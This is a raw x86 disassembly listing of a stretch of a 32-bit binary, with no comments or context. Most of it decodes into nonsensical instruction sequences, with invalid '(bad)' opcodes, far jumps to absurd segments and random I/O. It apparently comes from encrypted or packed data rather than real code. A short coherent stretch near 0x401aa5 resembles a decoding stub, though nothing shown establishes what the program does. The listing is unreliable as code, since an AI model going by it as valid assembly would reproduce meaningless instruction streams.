  4017ef:	add    ah,BYTE PTR [edi]
  4017f1:	xchg   ecx,eax
  4017f2:	adc    al,0xf8
  4017f4:	pop    ecx
  4017f5:	or     eax,0x5aba4896
  4017fa:	dec    ebx
  4017fb:	pusha  
  4017fc:	adc    BYTE PTR [edi-0x5],0x2d
  401800:	retf   
  401801:	mov    ah,0x1e
  401803:	cdq    
  401804:	mov    ah,0x79
  401806:	add    al,0xa4
  401808:	sub    bl,BYTE PTR [ebp-0x22]
  40180b:	mul    DWORD PTR [edx-0x3a211858]
  401811:	xlat   BYTE PTR ds:[ebx]
  401812:	add    DWORD PTR [edx+esi*1+0x1c],eax
  401816:	xchg   esi,eax
  401817:	add    bl,BYTE PTR [eax+esi*1+0x64]
  40181b:	dec    ebx
  40181c:	out    dx,eax
  40181d:	test   ebp,ecx
  40181f:	enter  0xb22a,0x3e
  401823:	popf   
  401824:	dec    eax
  401825:	fsubr  st,st(3)
  401827:	or     al,bh
  401829:	adc    eax,0x785796af
  40182e:	cmp    BYTE PTR [ebx-0x1da2264f],dl
  401834:	xor    eax,DWORD PTR ds:0x2c8f56e8
  40183a:	test   DWORD PTR [edx+0xc],esp
  40183d:	inc    esp
  40183e:	xchg   esi,eax
  40183f:	push   ebx
  401840:	fsubr  st,st(4)
  401842:	mov    ecx,0x69670f0d
  401847:	xor    eax,0x58a01e3
  40184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40184d:	outs   dx,DWORD PTR ds:[esi]
  40184e:	mov    fs,WORD PTR [ebx]
  401850:	mov    ah,BYTE PTR [ecx+0x77]
  401853:	lods   al,BYTE PTR ds:[esi]
  401854:	push   0xfffffff2
  401856:	in     eax,dx
  401857:	mov    cl,0xf3
  401859:	jns    0x4017de
  40185b:	push   es
  40185c:	fiadd  DWORD PTR [esi-0x6df09b60]
  401862:	xchg   esp,eax
  401863:	jg     0x4018b2
  401865:	inc    edi
  401866:	scas   al,BYTE PTR es:[edi]
  401867:	popa   
  401868:	aas    
  401869:	push   esp
  40186a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40186b:	stc    
  40186c:	jl     0x401839
  40186e:	xchg   edi,eax
  40186f:	sbb    BYTE PTR [edx-0x71],ah
  401872:	jecxz  0x401875
  401874:	loope  0x40189e
  401876:	cmp    DWORD PTR [ebx+ebx*4-0x64cd2914],eax
  40187d:	outs   dx,DWORD PTR ds:[esi]
  40187e:	sbb    cl,bl
  401880:	xchg   ebx,eax
  401881:	push   esi
  401882:	mov    es,WORD PTR [eax]
  401884:	xchg   edx,eax
  401885:	std    
  401886:	pushf  
  401887:	pusha  
  401888:	cwde   
  401889:	mov    edi,0x7d2ad832
  40188e:	add    ch,cl
  401890:	sar    DWORD PTR [esi-0x8814a2d],0x3b
  401897:	retf   
  401898:	or     esp,DWORD PTR [edx+0x48]
  40189b:	push   cs
  40189c:	sub    DWORD PTR [edx-0x22],esi
  40189f:	in     al,dx
  4018a0:	loop   0x401828
  4018a2:	add    al,0x7a
  4018a4:	add    ebx,0xf2d15ffa
  4018aa:	cmp    al,dh
  4018ac:	pop    DWORD PTR [edx]
  4018ae:	jecxz  0x401852
  4018b0:	(bad)  
  4018b1:	out    dx,eax
  4018b2:	stos   BYTE PTR es:[edi],al
  4018b3:	push   eax
  4018b4:	js     0x4018aa
  4018b6:	std    
  4018b7:	clc    
  4018b8:	jp     0x4018dd
  4018ba:	test   al,0xfa
  4018bc:	gs or  esp,esi
  4018bf:	or     BYTE PTR ds:0x2646ed44,dl
  4018c5:	add    al,0x96
  4018c7:	ja     0x4018ae
  4018c9:	pushf  
  4018ca:	mov    eax,0x929e6e73
  4018cf:	lds    ebx,FWORD PTR [ebx+0x4344b7ff]
  4018d5:	int    0x2e
  4018d7:	icebp  
  4018d8:	inc    eax
  4018d9:	jo     0x401931
  4018db:	outs   dx,BYTE PTR ds:[esi]
  4018dc:	ins    BYTE PTR es:[edi],dx
  4018dd:	pop    ecx
  4018de:	lock out 0x57,eax
  4018e1:	add    DWORD PTR [eax+0x6a],eax
  4018e4:	fldcw  WORD PTR [edi+0x4316034b]
  4018ea:	mov    esp,0x8b2978c4
  4018ef:	inc    ebp
  4018f0:	push   cs
  4018f1:	(bad)  
  4018f2:	jp     0x4018f0
  4018f4:	sub    eax,0x8607cc01
  4018f9:	hlt    
  4018fa:	mov    ecx,0xd80f26ed
  4018ff:	xchg   DWORD PTR [eax+0x4],edx
  401902:	mov    eax,ds:0xd4f276fe
  401907:	push   esi
  401908:	outs   dx,DWORD PTR ds:[esi]
  401909:	or     DWORD PTR [eax+ecx*8-0x4fe5c7d],esp
  401910:	xor    cl,BYTE PTR ds:0x1117f11f
  401916:	jae    0x4018cc
  401918:	inc    ebx
  401919:	es ss retfw 0xa8a
  40191f:	push   edi
  401920:	lea    ebx,ds:0x57c048af
  401926:	xchg   ebx,eax
  401927:	in     eax,0xc0
  401929:	cwde   
  40192a:	mov    dl,0x20
  40192c:	mov    ds:0xa188863c,eax
  401931:	cmp    BYTE PTR [eax+0x4f],dh
  401934:	inc    ebp
  401935:	or     al,0xc6
  401937:	stos   BYTE PTR es:[edi],al
  401938:	repz push ss
  40193a:	pop    esp
  40193b:	(bad)  
  40193c:	or     DWORD PTR [ecx-0x4c087d8b],esp
  401942:	in     al,dx
  401943:	scas   al,BYTE PTR es:[edi]
  401944:	test   eax,0xe8ce0cc
  401949:	data16 fwait
  40194b:	adc    al,0x81
  40194d:	out    0xf2,eax
  40194f:	xchg   DWORD PTR [edi],edx
  401951:	leave  
  401952:	ss jns 0x4018ff
  401955:	mov    al,0xc7
  401957:	xor    ecx,ebx
  401959:	push   ebp
  40195a:	(bad)  
  40195c:	mov    edx,0xc82fe354
  401961:	dec    ecx
  401962:	std    
  401963:	sbb    ebp,DWORD PTR [edx]
  401965:	jo     0x40190d
  401967:	xchg   edi,eax
  401968:	daa    
  401969:	jmp    0xcb2c24f4
  40196e:	jnp    0x4019ab
  401970:	lods   al,BYTE PTR ds:[esi]
  401971:	bound  ecx,QWORD PTR [eax]
  401973:	push   0x3ccc7db8
  401978:	jns    0x40190c
  40197a:	mov    ebp,DWORD PTR [ebp+0x37]
  40197d:	stos   DWORD PTR es:[edi],eax
  40197e:	mov    bl,0x86
  401980:	jg     0x401961
  401982:	ja     0x401936
  401984:	aam    0x78
  401986:	ds repnz pop ecx
  401989:	les    esi,FWORD PTR [edx-0x4d]
  40198c:	popa   
  40198d:	loopne 0x40193e
  40198f:	push   ebp
  401990:	jmp    0x343f:0x6979bea8
  401997:	xchg   ecx,eax
  401998:	inc    esp
  401999:	mov    esp,0xa2a51247
  40199e:	add    edx,0xc5cb80c2
  4019a4:	cmp    BYTE PTR [edi+ecx*1+0x6e55e672],dl
  4019ab:	cmp    al,0x79
  4019ad:	or     eax,0x153a61ae
  4019b2:	fstp   QWORD PTR [ebx+0x14]
  4019b5:	js     0x4019b3
  4019b7:	popa   
  4019b8:	sub    al,0xdf
  4019ba:	sbb    ecx,DWORD PTR [eax+0x7c]
  4019bd:	mov    fs,ecx
  4019bf:	mov    DWORD PTR [esi-0x5560e4ed],ecx
  4019c5:	sbb    bh,BYTE PTR [eax+0x76ccea7d]
  4019cb:	test   bh,bl
  4019cd:	push   ebp
  4019ce:	es xchg edx,eax
  4019d0:	test   DWORD PTR ds:0x2b9847cf,ecx
  4019d6:	fcom   st(4)
  4019d8:	adc    esi,0x32e6ce20
  4019de:	xchg   ebx,eax
  4019df:	outs   dx,DWORD PTR ds:[esi]
  4019e0:	je     0x401978
  4019e2:	mov    ebp,0xfea1c867
  4019e7:	jo     0x401a31
  4019e9:	dec    edi
  4019ea:	adc    BYTE PTR [esi+0xbb5829d],bl
  4019f0:	jmp    0x4019cf
  4019f2:	jne    0x4019ba
  4019f4:	mov    esp,0x4749d5f8
  4019f9:	mov    edi,0xbe1104df
  4019fe:	les    eax,FWORD PTR [ebx-0x78]
  401a01:	test   al,0x3f
  401a03:	dec    ecx
  401a04:	sbb    eax,0x3c81a86f
  401a09:	and    ah,BYTE PTR [ebx-0x19]
  401a0c:	pop    ss
  401a0d:	js     0x401a41
  401a0f:	xor    DWORD PTR [ebp+0x6e9d8efb],esp
  401a15:	xor    bl,BYTE PTR [ebx-0x77977acf]
  401a1b:	pop    ebp
  401a1c:	mov    ds:0xd39e11e2,al
  401a21:	jae    0x4019e3
  401a23:	and    eax,0x350c9097
  401a28:	mov    ecx,0x385ae3d
  401a2d:	inc    ebp
  401a2e:	loopne 0x4019d7
  401a30:	idiv   dl
  401a32:	imul   esi,DWORD PTR ds:0x8da8e56d,0x66
  401a39:	cmc    
  401a3a:	cli    
  401a3b:	sahf   
  401a3c:	sub    DWORD PTR [ebx-0x14],0xffffffd4
  401a40:	xor    eax,0xb36c76c
  401a45:	mov    ds:0xd2917e81,al
  401a4a:	pop    ecx
  401a4b:	sbb    DWORD PTR [ecx-0x5c],ebx
  401a4e:	xor    DWORD PTR [ebp-0x54dba6dd],esp
  401a54:	jne    0x401a65
  401a56:	or     al,0x64
  401a58:	lahf   
  401a59:	dec    esp
  401a5a:	xchg   BYTE PTR ds:0x99427667,ah
  401a60:	inc    edi
  401a61:	add    al,0xbe
  401a63:	minps  xmm6,XMMWORD PTR [ebx+0x574ce8ad]
  401a6a:	int3   
  401a6b:	scas   al,BYTE PTR es:[edi]
  401a6c:	jge    0x401a00
  401a6e:	aad    0xb2
  401a70:	(bad)  
  401a71:	loop   0x401a49
  401a73:	fcmovb st,st(5)
  401a75:	mov    esi,0x70512940
  401a7a:	mov    ds:0xd2ce5786,al
  401a7f:	sub    ch,BYTE PTR [edx+0x75]
  401a82:	ror    edi,0x12
  401a85:	arpl   WORD PTR [ebx],di
  401a87:	sahf   
  401a88:	xchg   edi,eax
  401a89:	inc    ebx
  401a8a:	xchg   DWORD PTR [eax],esp
  401a8c:	mov    WORD PTR [esi+0x51],cs
  401a8f:	lods   eax,DWORD PTR ds:[esi]
  401a90:	adc    bl,al
  401a92:	mov    al,0x3b
  401a94:	mov    edi,0xcafe7200
  401a99:	pop    ebp
  401a9a:	mul    DWORD PTR [edi+0x74]
  401a9d:	pop    ss
  401a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a9f:	mov    dh,0xc3
  401aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401aa2:	int    0xfc
  401aa4:	push   esi
  401aa5:	sbb    ebx,DWORD PTR ds:0x42a3c9
  401aab:	mov    esi,0x7510850
  401ab0:	xor    eax,esi
  401ab2:	push   edi
  401ab3:	add    ecx,0x2d8a
  401ab9:	mov    edi,0x327298
  401abe:	mov    ecx,DWORD PTR ds:0x42a32d
  401ac4:	mov    ebx,DWORD PTR ds:0x42a3dd
  401aca:	sub    ecx,ebx
  401acc:	and    ecx,DWORD PTR [ecx+ebx*1]
  401acf:	add    eax,edi
  401ad1:	mov    DWORD PTR ds:0x42a401,0x1cd1
  401adb:	jmp    0x401fe6
  401ae0:	enter  0xcbc2,0xd1
  401ae4:	(bad)  
  401ae6:	(bad)  
  401ae7:	shr    DWORD PTR [esi-0x3c],0xd6
  401aeb:	mov    bl,0xc8
  401aed:	aad    0xa5
  401aef:	repz push esp
  401af1:	pop    es
  401af2:	js     0x401b6c
  401af4:	push   0x7c
  401af6:	js     0x401b70
  401af8:	test   al,0xa0
  401afa:	add    DWORD PTR [ecx+edx*8],ebx
  401afd:	dec    ecx
  401afe:	jge    0x401b2f
  401b00:	retf   
  401b01:	and    al,0x50
  401b03:	dec    ebx
  401b04:	pop    ecx
  401b05:	sbb    BYTE PTR [edx+esi*4],bl
  401b08:	pop    edi
  401b09:	push   ebx
  401b0a:	xor    al,0x96
  401b0c:	enter  0x32d9,0x7c
  401b10:	ret    0x8183
  401b13:	shr    bl,cl
  401b15:	fwait
  401b16:	xchg   edi,eax
  401b17:	fwait
  401b18:	out    0xa4,al
  401b1a:	add    al,0xf2
  401b1c:	(bad)  
  401b1d:	rcl    BYTE PTR [edi],1
  401b1f:	mov    bh,0x6c
  401b21:	icebp  
  401b22:	pop    ecx
  401b23:	rcl    DWORD PTR [ebp-0x54],cl
  401b26:	pushf  
  401b27:	add    al,cl
  401b29:	jmp    0xfc22:0x638ab7d
  401b30:	out    dx,al
  401b31:	outs   dx,DWORD PTR ds:[esi]
  401b32:	push   ss
  401b33:	mov    al,0xee
  401b35:	push   ds
  401b36:	dec    ebx
  401b37:	mov    edi,0x872be8b8
  401b3c:	push   es
  401b3d:	je     0x401b8d
  401b3f:	ds shr ecx,0x81
  401b43:	and    BYTE PTR [edi-0x2a],al
  401b46:	pop    eax
  401b47:	mov    esp,DWORD PTR [ebx]
  401b49:	cld    
  401b4a:	jecxz  0x401b9d
  401b4c:	rol    dh,1
  401b4e:	cwde   
  401b4f:	mov    al,0xbf
  401b51:	mov    ah,0x22
  401b53:	xor    eax,edx
  401b55:	mov    ah,0xc
  401b57:	mov    ?,ebp
  401b59:	test   DWORD PTR [ebp-0x1361f9de],ebp
  401b5f:	mov    bl,0x25
  401b61:	mov    DWORD PTR [ebp-0xe4e6574],ebx
  401b67:	ds nop
  401b69:	dec    esi
  401b6a:	cld    
  401b6b:	or     eax,0x9cd35057
  401b70:	js     0x401b04
  401b72:	xchg   edx,eax
  401b73:	jmp    0x85b3eef
  401b78:	xor    dh,BYTE PTR [esi+0x15]
  401b7b:	les    eax,FWORD PTR [eax-0x6b5a5ee6]
  401b81:	pusha  
  401b82:	das    
  401b83:	out    dx,al
  401b84:	fnstcw WORD PTR [esi-0xb]
  401b87:	inc    edi
  401b88:	mov    WORD PTR ds:0xe0cf17e1,es
  401b8e:	xchg   DWORD PTR ds:0xaa31d4a6,edx
  401b94:	pop    edx
  401b95:	xchg   BYTE PTR [ebx-0x6b],dh
  401b98:	mov    ds:0xe667cfd7,al
  401b9d:	enter  0x56,0x7a
  401ba1:	mov    eax,ds:0x4b27aaff
  401ba6:	mov    bl,0xf4
  401ba8:	push   ebp
  401ba9:	aas    
  401baa:	pop    es
  401bab:	fstp   QWORD PTR [eax+0x21726d46]
  401bb1:	repnz or BYTE PTR [eax],al
  401bb4:	hlt    
  401bb5:	aaa    
  401bb6:	xlat   BYTE PTR ss:[ebx]
  401bb8:	pop    ss
  401bb9:	loop   0x401b4d
  401bbb:	dec    edi
  401bbc:	(bad)  
  401bbd:	lods   al,BYTE PTR ds:[esi]
  401bbe:	sub    DWORD PTR [ebp+0x7a],ebx
  401bc1:	mov    edx,DWORD PTR [edi-0xfc25ee]
  401bc7:	hlt    
  401bc8:	les    esi,FWORD PTR [ecx]
  401bca:	fwait
  401bcb:	imul   edx,DWORD PTR [esi],0x4c
  401bce:	mov    cs,WORD PTR [ebx+0x53c732cb]
  401bd4:	ins    DWORD PTR es:[edi],dx
  401bd5:	shl    esp,0xe7
  401bd8:	mov    ebp,0xb41307c
  401bdd:	shr    DWORD PTR [ecx-0x281dc902],0x15
  401be4:	xor    BYTE PTR [edi+0x5c],ah
  401be7:	lea    edx,[ebx+0x56]
  401bea:	sub    al,BYTE PTR [edi]
  401bec:	call   0x965f:0xa101ed
  401bf3:	or     DWORD PTR [ebx+0x55],esp
  401bf6:	in     al,0x46
  401bf8:	rcr    DWORD PTR [esi-0x27],cl
  401bfb:	fisttp QWORD PTR [esi]
  401bfd:	push   ebp
  401bfe:	cld    
  401bff:	ficomp WORD PTR [ebx+eax*2]
  401c02:	imul   esp,DWORD PTR [ebx],0x3c
  401c05:	pop    edi
  401c06:	dec    ebx
  401c07:	cmp    BYTE PTR ds:0xe6c8425,bl
  401c0d:	and    eax,0xd5045722
  401c12:	into   
  401c13:	jl     0x401c78
  401c15:	and    ah,bl
  401c17:	ret    0xb313
  401c1a:	(bad)  [ebx+edx*4+0x72]
  401c1e:	sub    al,0x6b
  401c20:	idiv   DWORD PTR [eax+0x52027ec5]
  401c26:	jnp    0x401c34
  401c28:	add    al,0xda
  401c2a:	jnp    0x401c72
  401c2c:	loope  0x401ca3
  401c2e:	sbb    BYTE PTR [eax],dl
  401c30:	retf   0x1bec
  401c33:	inc    esi
  401c34:	test   dl,cl
  401c36:	pusha  
  401c37:	push   ds
  401c38:	arpl   WORD PTR [ebx-0x43],dx
  401c3b:	bound  edx,QWORD PTR [esi]
  401c3d:	cld    
  401c3e:	mov    eax,0x4e908ff4
  401c43:	mov    ebp,DWORD PTR [ebp-0x75]
  401c46:	int    0x87
  401c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c49:	push   edi
  401c4a:	pop    edx
  401c4b:	mov    esp,0x2efe0734
  401c50:	or     al,0xea
  401c52:	xchg   DWORD PTR [edx],ebp
  401c54:	jae    0x401c89
  401c56:	pop    eax
  401c57:	sti    
  401c58:	shl    esi,1
  401c5a:	fwait
  401c5b:	jp     0x401c90
  401c5d:	div    bh
  401c5f:	mov    esi,0xc2d58592
  401c64:	sbb    eax,0x7a35973c
  401c69:	jno    0x401c5d
  401c6b:	add    eax,DWORD PTR [ebx]
  401c6d:	jl     0x401cba
  401c6f:	mov    ebx,0xa4ab6745
  401c74:	mov    ebx,DWORD PTR [esi]
  401c76:	push   cs
  401c77:	adc    BYTE PTR [edx-0x1a08c7c7],0xa7
  401c7e:	aaa    
  401c7f:	jbe    0x401c50
  401c81:	cmc    
  401c82:	sbb    ebp,esi
  401c84:	pop    esp
  401c85:	pop    ebx
  401c86:	sti    
  401c87:	ret    
  401c88:	in     al,0xb7
  401c8a:	xor    esi,DWORD PTR [ebx]
  401c8c:	add    DWORD PTR [ecx+edi*1+0x455ec6ef],esp
  401c93:	dec    edi
  401c94:	shr    DWORD PTR [eax-0x46],1
  401c97:	push   edi
  401c98:	data16 mov ch,0xeb
  401c9b:	aam    0x84
  401c9d:	cdq    
  401c9e:	sub    DWORD PTR [ecx+ecx*2+0x36],ebp
  401ca2:	js     0x401cdb
  401ca4:	adc    ah,BYTE PTR [ecx+0x21867a74]
  401caa:	bound  ebx,QWORD PTR [ecx+0xf61eb9b]
  401cb0:	push   esp
  401cb1:	xor    al,BYTE PTR [esi]
  401cb3:	sub    al,0x5b
  401cb5:	jae    0x401c66
  401cb7:	push   ds
  401cb8:	and    ebp,DWORD PTR [eax+0x48c4a2ad]
  401cbe:	mov    edx,0x55b0f3ea
  401cc3:	shl    DWORD PTR ds:0x381fcefb,cl
  401cc9:	test   al,0xa0
  401ccb:	jg     0x401cad
  401ccd:	jge    0x401c6d
  401ccf:	out    dx,eax
  401cd0:	(bad)  
  401cd1:	cmc    
  401cd2:	div    BYTE PTR [esi-0x6c086ba8]
  401cd8:	icebp  
  401cd9:	pop    ecx
  401cda:	mov    ah,0x6a
  401cdc:	fbstp  TBYTE PTR [ebx+0x76e461df]
  401ce2:	sbb    eax,0xb5964904
  401ce7:	ret    0xc7aa
  401cea:	and    BYTE PTR [edi-0x7],ah
  401ced:	xchg   al,al
  401cef:	xchg   BYTE PTR [esi-0x2839805b],ah
  401cf5:	mov    eax,0xf7a2ce53
  401cfa:	addr16 fwait
  401cfc:	inc    DWORD PTR [edx]
  401cfe:	test   BYTE PTR [esi-0x3],ch
  401d01:	mov    DWORD PTR [edi+ebx*4-0x12],ecx
  401d05:	jbe    0x401d5a
  401d07:	inc    eax
  401d08:	(bad)  
  401d09:	iret   
  401d0a:	outs   dx,DWORD PTR ds:[esi]
  401d0b:	(bad)  
  401d0c:	out    0xc1,eax
  401d0e:	push   ecx
  401d0f:	dec    ecx
  401d10:	mov    ah,0x10
  401d12:	jno    0x401d77
  401d14:	ins    DWORD PTR es:[edi],dx
  401d15:	jl     0x401cdd
  401d17:	sti    
  401d18:	dec    ebx
  401d19:	mov    edi,0x9cdfbefa
  401d1e:	leave  
  401d1f:	adc    esp,DWORD PTR [edx+eax*1-0x2ef5b739]
  401d26:	lahf   
  401d27:	addr16 std 
  401d29:	fistp  DWORD PTR [ebx-0x3ae6bc19]
  401d2f:	inc    edi
  401d30:	xchg   edx,eax
  401d31:	jo     0x401da1
  401d33:	mov    ebx,0x7509e77c
  401d38:	xor    BYTE PTR [edi],bh
  401d3a:	mov    ds:0xa4821dd4,al
  401d3f:	or     bl,BYTE PTR [ebx-0x3e834939]
  401d45:	sub    bl,0x4a
  401d48:	les    edx,FWORD PTR [esi]
  401d4a:	das    
  401d4b:	mov    esi,0x8b1d46ba
  401d50:	mov    eax,ds:0x12c030e5
  401d55:	and    eax,0x72c75091
  401d5a:	add    DWORD PTR [edi+0x4b6482d8],ebx
  401d60:	aaa    
  401d61:	push   esp
  401d62:	inc    ecx
  401d63:	ins    DWORD PTR es:[edi],dx
  401d64:	jne    0x401d4b
  401d66:	lahf   
  401d67:	mov    edi,0xa4b4f142
  401d6c:	stos   DWORD PTR es:[edi],eax
  401d6d:	out    dx,eax
  401d6e:	popf   
  401d6f:	mov    cl,0xb4
  401d71:	sub    al,0x34
  401d73:	or     eax,0xca6e947e
  401d78:	inc    ebp
  401d79:	sahf   
  401d7a:	fisttp DWORD PTR [esi+ebp*8+0x2633dcaa]
  401d81:	sbb    dl,bl
  401d83:	retf   0x85b4
  401d86:	std    
  401d87:	push   esi
  401d88:	pop    ebp
  401d89:	inc    ebp
  401d8a:	aaa    
  401d8b:	jbe    0x401e08
  401d8d:	gs loopne 0x401d53
  401d90:	inc    ecx
  401d91:	jmp    FWORD PTR [ecx]
  401d93:	mov    esi,eax
  401d95:	call   0x5e6e:0x4cb96ba
  401d9c:	mov    esp,0x42bf88d8
  401da1:	loop   0x401dc6
  401da3:	xchg   BYTE PTR [ebx+0x7349a721],dh
  401da9:	ficomp DWORD PTR [edx]
  401dab:	jge    0x401d69
  401dad:	arpl   WORD PTR [ebx-0x3c],bx
  401db0:	bound  ebp,QWORD PTR [edx-0x35]
  401db3:	sbb    ebp,eax
  401db5:	sub    dl,cl
  401db7:	clc    
  401db8:	call   0x50ce:0x4690010
  401dbf:	outs   dx,DWORD PTR ds:[esi]
  401dc0:	int    0x36
  401dc2:	lods   eax,DWORD PTR ds:[esi]
  401dc3:	inc    esi
  401dc4:	outs   dx,BYTE PTR ds:[esi]
  401dc5:	sub    bl,BYTE PTR [ecx+0x5f0b11de]
  401dcb:	sbb    bh,BYTE PTR [edx-0x40]
  401dce:	push   ebx
  401dcf:	dec    esi
  401dd0:	popaw  
  401dd2:	fiadd  WORD PTR [ebx]
  401dd4:	add    ch,BYTE PTR [ebp+0x700bea3b]
  401dda:	ins    BYTE PTR es:[edi],dx
  401ddb:	and    sp,WORD PTR [eax-0x66]
  401ddf:	adc    dl,BYTE PTR [ebx-0x48e92f81]
  401de5:	lods   al,BYTE PTR ds:[esi]
  401de6:	(bad)  
  401de7:	imul   eax,DWORD PTR ds:0x5c5d4dfc,0xc
  401dee:	call   0x137f:0x9c678350
  401df5:	and    cl,BYTE PTR [edx-0x2fa921c]
  401dfb:	pop    es
  401dfc:	data16 adc BYTE PTR [eax+0x1e],0x83
  401e01:	js     0x401e66
  401e03:	and    BYTE PTR [edx],ah
  401e05:	mov    DWORD PTR [eax-0x1456b9d5],ebx
  401e0b:	dec    eax
  401e0c:	popf   
  401e0d:	and    BYTE PTR [ecx+0x6d36398b],0x38
  401e14:	or     eax,0xff510155
  401e19:	retf   
  401e1a:	jns    0x401db5
  401e1c:	ret    0xa6b5
  401e1f:	jmp    0x401de3
  401e21:	and    BYTE PTR [esi-0x346a0265],bh
  401e27:	pop    esi
  401e28:	add    eax,0xd8037ae2
  401e2d:	call   0xf27d:0xd6b8a54b
  401e34:	bound  ebp,QWORD PTR [edx]
  401e36:	push   eax
  401e37:	mov    edx,0x9033ab6c
  401e3c:	and    cl,BYTE PTR [ebx-0x66]
  401e3f:	push   0x730d7b91
  401e44:	adc    al,0x26
  401e46:	std    
  401e47:	pushf  
  401e48:	and    edx,DWORD PTR [esi+0x55152552]
  401e4e:	cmc    
  401e4f:	ja     0x401e9b
  401e51:	xchg   edi,eax
  401e52:	jnp    0x401e51
  401e54:	mov    ch,ah
  401e56:	jmp    0x401de1
  401e58:	outs   dx,BYTE PTR ds:[esi]
  401e59:	ret    0xbe32
  401e5c:	out    dx,eax
  401e5d:	cmovo  esi,DWORD PTR [edx-0x390cbe75]
  401e64:	retf   
  401e65:	ffree  st(4)
  401e67:	cmp    DWORD PTR [eax-0x422773d],0x18ec80e2
  401e71:	inc    ebp
  401e72:	pop    edx
  401e73:	pop    ecx
  401e74:	cmp    eax,edi
  401e76:	jmp    0xb390ba13
  401e7b:	dec    esp
  401e7c:	jno    0x401ee5
  401e7e:	not    esp
  401e80:	inc    ebx
  401e81:	and    al,0x14
  401e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e84:	mov    esp,0xce269bfc
  401e89:	repz inc edi
  401e8b:	push   cs
  401e8c:	enter  0x5882,0x2a
  401e90:	push   ds
  401e91:	lahf   
  401e92:	mov    eax,ds:0xb4637838
  401e97:	push   esp
  401e98:	xor    BYTE PTR [esi+0x76c8a50e],ch
  401e9e:	xor    al,ah
  401ea0:	aam    0x57
  401ea2:	jle    0x401eb2
  401ea4:	mov    dl,0x3b
  401ea6:	or     eax,0x5ab9fab
  401eab:	(bad)  
  401eac:	iret   
  401ead:	stc    
  401eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eaf:	mov    esi,0x92a5a056
  401eb4:	or     eax,0x575b2938
  401eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eba:	scas   eax,DWORD PTR es:[edi]
  401ebb:	mov    BYTE PTR [edx+0x6b7548e4],al
  401ec1:	and    BYTE PTR [ebp-0x4de4e54a],ch
  401ec7:	addr16 sbb eax,0x6b64c68a
  401ecd:	ret    0x63bb
  401ed0:	xor    ah,BYTE PTR [edx]
  401ed2:	test   eax,0x780e1584
  401ed7:	cmp    ecx,DWORD PTR [eax]
  401ed9:	popa   
  401eda:	jle    0x401f4e
  401edc:	retf   
  401edd:	push   esi
  401ede:	mov    ds:0x62a00d1b,eax
  401ee3:	sub    BYTE PTR [edx+0x1f7be9da],al
  401ee9:	shl    eax,1
  401eeb:	push   ebx
  401eec:	cmp    eax,0x1e4628e6
  401ef1:	cdq    
  401ef2:	lahf   
  401ef3:	jmp    0x2b827c48
  401ef8:	inc    BYTE PTR [ebp+0x726cd746]
  401efe:	stc    
  401eff:	(bad)  
  401f00:	scas   al,BYTE PTR es:[edi]
  401f01:	mov    ds:0x8f48f0a4,eax
  401f06:	stc    
  401f07:	mov    ecx,0xbe83ee9c
  401f0c:	(bad)  
  401f0d:	loopne 0x401e9e
  401f0f:	and    BYTE PTR [esi-0x3f1469f6],al
  401f15:	pusha  
  401f16:	mov    es,WORD PTR [eax]
  401f18:	daa    
  401f19:	push   0x10
  401f1b:	or     DWORD PTR [ebp+0x6e],edi
  401f1e:	push   esp
  401f1f:	ror    DWORD PTR [ebp+0x4c9b9e4],1
  401f25:	sub    BYTE PTR [edx-0x11],ah
  401f28:	jno    0x401f90
  401f2a:	push   0x79b3a055
  401f2f:	leave  
  401f30:	js     0x401f25
  401f32:	inc    esp
  401f33:	xor    BYTE PTR [ebp-0x3e84edc],al
  401f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f3b:	cmp    ah,BYTE PTR [ecx-0x54]
  401f3e:	push   esi
  401f3f:	imul   ecx,DWORD PTR [esi-0x3b],0xd88d2071
  401f46:	test   eax,0x586b97ef
  401f4b:	add    BYTE PTR [esp+esi*4],al
  401f4e:	xchg   ebp,eax
  401f4f:	pop    edx
  401f50:	mov    edi,0x521d02fa
  401f55:	jp     0x401ede
  401f57:	xchg   ebx,eax
  401f58:	(bad)  
  401f59:	cmp    DWORD PTR [ecx-0x75],ecx
  401f5c:	imul   eax,ebx,0xffffffb6
  401f5f:	(bad)  [esi-0x5274263]
  401f65:	mov    ah,0xfc
  401f67:	xchg   edx,eax
  401f68:	das    
  401f69:	imul   ebp,DWORD PTR [edx+0x40320aaf],0xfffffff0
  401f70:	sub    DWORD PTR [ebx+0x6d],edi
  401f73:	mov    ebx,0x7ad9f791
  401f78:	(bad)  
  401f79:	es enter 0x3c5c,0xeb
  401f7e:	lea    esp,[edx+0x7b]
  401f81:	test   eax,0xe8adf633
  401f86:	retf   0xf25c
  401f89:	xor    al,0xd1
  401f8b:	lods   eax,DWORD PTR ds:[esi]
  401f8c:	pop    ebx
  401f8d:	not    DWORD PTR ds:0x2c2acb07
  401f93:	mov    bh,0x18
  401f95:	sti    
  401f96:	and    eax,0x8376f9dd
  401f9b:	jp     0x401fae
  401f9d:	adc    eax,0x36a3e26
  401fa2:	sub    ebx,DWORD PTR [edi-0x733895c]
  401fa8:	xor    BYTE PTR [esi],ah
  401faa:	pusha  
  401fab:	outs   dx,BYTE PTR ds:[esi]
  401fac:	sub    esp,DWORD PTR [bp+di]
  401faf:	pop    ecx
  401fb0:	icebp  
  401fb1:	sub    ah,0xd4
  401fb4:	add    al,0x32
  401fb6:	push   ecx
  401fb7:	std    
  401fb8:	mov    esi,0xc90bc42c
  401fbd:	call   0x415:0x26ad6566
  401fc4:	add    BYTE PTR [edi],0xa3
  401fc7:	retf   
  401fc8:	cli    
  401fc9:	cld    
  401fca:	stos   BYTE PTR es:[edi],al
  401fcb:	mov    edx,0xb60185af
  401fd0:	inc    ebp
  401fd1:	outs   dx,BYTE PTR ds:[esi]
  401fd2:	jnp    0x401f77
  401fd4:	stos   DWORD PTR es:[edi],eax
  401fd5:	dec    edi
  401fd6:	push   edx
  401fd7:	loope  0x401fc1
  401fd9:	ds mov ebp,0x6d4b05a1
  401fdf:	mov    dl,0x96
  401fe1:	test   al,0xab
  401fe3:	mov    esp,ds
  401fe5:	sahf   
